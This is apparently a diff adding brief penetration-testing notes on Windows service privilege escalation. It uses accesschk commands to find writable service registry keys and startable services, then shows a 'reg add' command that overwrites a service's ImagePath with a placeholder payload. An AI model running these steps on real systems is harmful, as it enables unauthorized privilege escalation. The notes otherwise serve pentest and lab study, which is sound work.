@@ -1,0 +1,11 @@
+File Permission Checker (Read & Write Access):
+accesschk.exe /accepteula -uvwqk <Vulnerable reg file>
+
+Can we start/stop Service?
+accesschk.exe /accepteula -ucqv <username> <service-name>
+
+Image Path Checker:
+reg query <Vulnerable reg path (Complete)>
+
+
+reg add <Vulnerable reg file (complete path)> /v ImagePath /t REG_EXPAND_SZ /d <Your Payload> /f
